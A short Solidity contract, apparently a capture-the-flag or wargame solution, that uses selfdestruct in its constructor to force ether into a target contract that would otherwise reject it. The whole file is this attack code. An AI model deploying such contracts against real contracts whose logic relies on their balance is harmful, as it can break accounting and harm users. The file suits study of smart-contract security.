// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.4;

contract ForceAttack {
    constructor(address payable forceContract) payable {
        selfdestruct(forceContract);
    }
}